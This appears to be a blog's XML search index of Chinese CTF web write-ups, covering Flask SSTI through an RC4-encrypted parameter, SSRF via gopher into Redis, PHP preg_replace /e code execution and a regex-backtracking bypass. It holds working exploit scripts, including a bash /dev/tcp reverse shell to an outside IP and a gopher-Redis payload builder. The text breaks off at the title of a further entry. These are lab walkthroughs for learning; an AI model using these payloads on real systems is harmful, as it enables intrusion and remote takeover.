<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[CISCN 2019华东南]Double Secret</title>
    <url>/2025/01/21/CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret/</url>
    <content><![CDATA[<h1 id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h1><p><img src="/2025/01/21/CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret/1.png" alt="1"></p>
<span id="more"></span>

<p>进入题目环境看一下，没有什么思路</p>
<p>扫目录：</p>
<p><img src="/2025/01/21/CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret/2.png" alt="2"></p>
<p>发现可疑的secret，还有concole，说明是python的flask框架</p>
<p>访问secret目录</p>
<p><img src="/2025/01/21/CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret/3.png" alt="3"></p>
<p>可能是后台会解密传入的secret?</p>
<p>传入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?secret=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是报错了，这里找到一个可疑的报错，应该是传入命令的解密过程</p>
<p><img src="/2025/01/21/CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret/4.png" alt="4"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">   rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">   deS=rc.do_crypt(secret)</span><br><span class="line">   a=render_template_string(safe(deS))</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">   <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>一个解密函数</p>
<p>RC4密钥是HereIsTreasure</p>
<p>那么写个加密函数RC4对称加密一下payload即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">key=<span class="string">b&#x27;HereIsTreasure&#x27;</span></span><br><span class="line">msg=<span class="string">b&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">enc=ARC4.new(key).encrypt(msg)</span><br><span class="line">enc=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,enc)).encode()</span><br><span class="line"></span><br><span class="line">req=requests.get(<span class="string">&#x27;http://node4.anna.nssctf.cn:28043/secret&#x27;</span>,&#123;<span class="string">&#x27;secret&#x27;</span>:enc&#125;)</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为服务端老旧的py2编码问题，要用enc=&#x27;&#x27;.join(map(chr,enc)).encode()这样很别扭的办法适配:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CISCN国赛</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>第18届全国大学生软件系统安全赛</title>
    <url>/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="第18届全国大学生软件系统安全赛"><a href="#第18届全国大学生软件系统安全赛" class="headerlink" title="第18届全国大学生软件系统安全赛"></a>第18届全国大学生软件系统安全赛</h1><p>淮北师范大学二队（华东赛区NO.25）</p>
<span id="more"></span>

<h2 id="Misc-1-1"><a href="#Misc-1-1" class="headerlink" title="Misc(1&#x2F;1)"></a>Misc(1&#x2F;1)</h2><h3 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a><strong>钓鱼邮件</strong></h3><p>拿到一个mail.eml邮件取证文件</p>
<p>Notepad打开</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/1.png" alt="图片1"></p>
<p>底下有很长的base64，解码是zip文件，下载下来解压文件发现有密码，因为邮件文本内容是生日快乐，所以使用生日大字典进行爆破</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/2.png" alt="图片1"></p>
<p>解压之后，里面是个exe文件，用天穹动态分析沙箱分析</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/3.png" alt="图片1"></p>
<p>查看到异常的tcp通信，拿到ip和port，md5加密即可</p>
<h2 id="Web-1-1"><a href="#Web-1-1" class="headerlink" title="Web(1&#x2F;1)"></a>Web(1&#x2F;1)</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h3><p>下载附件获得题目后端源码，按照靶机测试，应该是存在ssrf漏洞</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/4.png" alt="图片1"></p>
<p>可以出网，好像只能一次？</p>
<p>尝试访问本地文件</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/5.png" alt="图片1"></p>
<p>尝试读取flag不行，看一下附件</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/6.png" alt="图片1"></p>
<p>看到存在redis，联想到ssrf+redis可以getshll，看一下redis.conf</p>
<p>密码直接泄露了，不是未授权访问</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/7.png" alt="图片1"></p>
<p>main.rua内容</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_file</span><span class="params">(filename)</span></span></span><br><span class="line">    <span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: Could not open file &quot;</span> .. filename)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> content = file:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line">    file:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">execute_lua_code</span><span class="params">(script_content)</span></span></span><br><span class="line">    <span class="keyword">local</span> lua_code = script_content:<span class="built_in">match</span>(<span class="string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> lua_code <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> chunk, err = <span class="built_in">load</span>(lua_code)</span><br><span class="line">        <span class="keyword">if</span> chunk <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> success, result = <span class="built_in">pcall</span>(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> success <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error executing Lua code: &quot;</span>, result)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error loading Lua code: &quot;</span>, err)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: No valid Lua code block found.&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> filename = <span class="string">&quot;/scripts/visit.script&quot;</span></span><br><span class="line">    <span class="keyword">local</span> script_content = read_file(filename)</span><br><span class="line">    <span class="keyword">if</span> script_content <span class="keyword">then</span></span><br><span class="line">        execute_lua_code(script_content)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要是三个功能，先读取文件内容，执行读取的脚本，加载&#x2F;script下的脚本</p>
<p>&#x2F;script下的脚本必须头和尾必须要符合匹配：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">##LUA_START##</span><br><span class="line">##LUA_END##</span><br></pre></td></tr></table></figure>



<p>&#x2F;script&#x2F;visit.script的内容</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">##LUA_START##</span><br><span class="line">local curl = require(&quot;cURL&quot;)</span><br><span class="line">local redis = require(&quot;resty.redis&quot;)</span><br><span class="line"></span><br><span class="line">ngx.req.read_body()</span><br><span class="line">local args = ngx.req.get_uri_args()</span><br><span class="line">local url = args.url</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> url then</span><br><span class="line">    ngx.say(&quot;URL parameter is missing!&quot;)</span><br><span class="line">    return</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">local red = redis:new()</span><br><span class="line"><span class="function">red:<span class="title">set_timeout</span>(1000)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">ok</span>, <span class="title">err</span> = <span class="title">red:connect</span>(&quot;127.0.0.1&quot;, 6379)</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="title">not</span> <span class="title">ok</span> <span class="title">then</span></span></span><br><span class="line"><span class="function">    <span class="title">ngx.say</span>(&quot;<span class="title">Failed</span> <span class="title">to</span> <span class="title">connect</span> <span class="title">to</span> <span class="title">Redis</span>: &quot;, <span class="title">err</span>)</span></span><br><span class="line"><span class="function">    <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">res</span>, <span class="title">err</span> = <span class="title">red:get</span>(<span class="title">url</span>)</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="title">res</span> <span class="title">and</span> <span class="title">res</span> ~= <span class="title">ngx.null</span> <span class="title">then</span></span></span><br><span class="line"><span class="function">    <span class="title">ngx.say</span>(<span class="title">res</span>)</span></span><br><span class="line"><span class="function">    <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">c</span> = <span class="title">curl.easy</span> &#123;</span></span><br><span class="line"><span class="function">    <span class="title">url</span> = <span class="title">url</span>,</span></span><br><span class="line"><span class="function">    <span class="title">timeout</span> = 5,</span></span><br><span class="line"><span class="function">    <span class="title">connecttimeout</span> = 5</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">response_body</span> = &#123;&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c:setopt_writefunction</span>(<span class="title">table.insert</span>, <span class="title">response_body</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">ok</span>, <span class="title">err</span> = <span class="title">pcall</span>(<span class="title">c.perform</span>, <span class="title">c</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="title">not</span> <span class="title">ok</span> <span class="title">then</span></span></span><br><span class="line"><span class="function">    <span class="title">ngx.say</span>(&quot;<span class="title">Failed</span> <span class="title">to</span> <span class="title">perform</span> <span class="title">request</span>: &quot;, <span class="title">err</span>)</span></span><br><span class="line"><span class="function">    <span class="title">c:close</span>()</span></span><br><span class="line"><span class="function">    <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c:close</span>()</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">response_str</span> = <span class="title">table.concat</span>(<span class="title">response_body</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">ok</span>, <span class="title">err</span> = <span class="title">red:setex</span>(<span class="title">url</span>, 3600, <span class="title">response_str</span>)</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="title">not</span> <span class="title">ok</span> <span class="title">then</span></span></span><br><span class="line"><span class="function">    <span class="title">ngx.say</span>(&quot;<span class="title">Failed</span> <span class="title">to</span> <span class="title">save</span> <span class="title">response</span> <span class="title">in</span> <span class="title">Redis</span>: &quot;, <span class="title">err</span>)</span></span><br><span class="line"><span class="function">    <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ngx.say</span>(<span class="title">response_str</span>)</span></span><br><span class="line"><span class="function">##<span class="title">LUA_END</span>##</span></span><br></pre></td></tr></table></figure>

<p>确实是存在ssrf漏洞，和我们一开始测试的一样</p>
<p>那么在main.lua下是去读取这个文件</p>
<p>如果覆盖该文件为我们的脚本，就可以控制命令执行</p>
<p>flag文件似乎没有读取权限，那就要执行 readflag 程序</p>
<p>参考网上的脚本生成payload</p>
<p>用gpoher协议绝对路径写webshell</p>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">SSRF—gopher和dict打redis_gopher dict协议攻击redis-CSDN博客</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&#x27;&#x27;&#x27;\n\n##LUA_START##os.execute(&quot;bash -c &#x27;sh -i &amp;&gt;/dev/tcp/120.233.26.237/43969 0&gt;&amp;1&#x27;&quot;)##LUA_END##\n\n&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># \n \t</span></span><br><span class="line">filename = <span class="string">&quot;visit.script&quot;</span></span><br><span class="line">path = <span class="string">&quot;/scripts&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;foobared&quot;</span>  <span class="comment"># 此处也可以填入Redis的密码, 在不存在Redis未授权的情况下适用</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 Redis 有密码，添加 AUTH 命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化 Redis 命令</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))  <span class="comment"># Redis 协议中命令的元素数量</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))  <span class="comment"># 对命令进行 URL 编码</span></span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># 输出构造的 Gopher 请求 URL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功反弹shell执行 readflag</p>
<p><img src="/2025/01/09/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B/8.png" alt="图片1"></p>
]]></content>
      <categories>
        <category>比赛writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>[BJDCTF 2020]ZJCTF，不过如此</title>
    <url>/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    <content><![CDATA[<h1 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h1><h2 id="php动态访问变量"><a href="#php动态访问变量" class="headerlink" title="php动态访问变量"></a>php动态访问变量</h2><p>题目链接：[<a href="https://www.nssctf.cn/problem/717">BJDCTF 2020]ZJCTF，不过如此 | NSSCTF</a></p>
 <span id="more"></span>

<p>拿到题目先看代码</p>
<p><img src="/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/1.png" alt="img"></p>
<p>file_get_contents函数是读取文件的，不过可以使用伪协议，那么我们给text变量传入data伪协议即可满足判断：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream</span><br></pre></td></tr></table></figure>

<p>直接给file传入next.php读取失败</p>
<p><img src="/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/2.png" alt="img"></p>
<p>考虑用php伪协议读取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<p>Base64解密后得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>这里的 foreach($_GET as $re &#x3D;&gt; $str) 语句会把GET方法传入的键值对分别赋值给$re和$str</p>
<p>之后调用 complex($re, $str) 函数</p>
<p>complex($re, $str) 函数中正则表达式采用了&#x2F;e方法，PHP版本5.6.40，存在命令执行漏洞</p>
<p>preg_replace的第二个参数会被当作命令执行，但是第二个参数是无法修改的，观察表达式，</p>
<p>匹配$re变量加前后的单个字符，strtolower(“\1”)正好表达的就是匹配区的第一个值，如果第一个字符串刚好满足匹配，就会被选中，命令执行</p>
<p>直接传入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?\S=$&#123;phpinfo()&#125; </span><br></pre></td></tr></table></figure>

<p>查找flag即可，这里的\S是匹配非空白字符，*是上述内容匹配多次，这样就会匹配传入的非空值，替换表达式的第二个值</p>
<p><img src="/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/3.png" alt="img"></p>
<p>这里的${}是动态访问变量，比如${getFlag()}就可以直接调用getFlag() 函数，然后再cmd传参也可以有类似效果，不过${}可以直接调用phpinfo()函数</p>
]]></content>
      <categories>
        <category>日常writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>[NISACTF 2022]middlerce</title>
    <url>/2024/11/22/NISACTF-2022-middlerce/</url>
    <content><![CDATA[<h1 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h1><h2 id="rce正则回溯绕过"><a href="#rce正则回溯绕过" class="headerlink" title="rce正则回溯绕过"></a>rce正则回溯绕过</h2><p>题目链接：<a href="https://www.nssctf.cn/problem/1897">https://www.nssctf.cn/problem/1897</a></p>
 <span id="more"></span>

<p>进入环境，看一下代码：</p>
<p><img src="/2024/11/22/NISACTF-2022-middlerce/1.png" alt="img"></p>
<p>这里的preg_match过滤了所有ASCII字符</p>
<p>但是if语句是直接判断的，就可以考虑正则回溯绕过</p>
<p>php中为了防止拒绝服务攻击，给 pcre 设定了一个回溯次数上限，一般是100万次，输入字符串长度超过100万</p>
<p>preg_match函数就会返回false，这里就会绕过判断</p>
<p>写个python脚本测试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28685/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;phpinfo();&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;letter&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<p><img src="/2024/11/22/NISACTF-2022-middlerce/2.png" alt="img"></p>
<p>猜测是被checkdata函数过滤了</p>
<p>Fuzz一下</p>
<p><img src="/2024/11/22/NISACTF-2022-middlerce/3.png" alt="img"></p>
<p>长度198就是被过滤的，很多函数都是用不了的，那只能php标签闭合，反引号执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>``<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">echo</span> ... <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行获得flag的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `ls /`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/22/NISACTF-2022-middlerce/4.png" alt="img"></p>
<p>然后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p>完整exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28325/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">with open(&quot;123.txt&quot;,&#x27;w&#x27;) as f:</span></span><br><span class="line"><span class="string">    f.write(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;letter&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/22/NISACTF-2022-middlerce/5.png" alt="img"></p>
]]></content>
      <categories>
        <category>日常writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>[天翼杯 2021]esay_eval</title>
    <url>/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/</url>
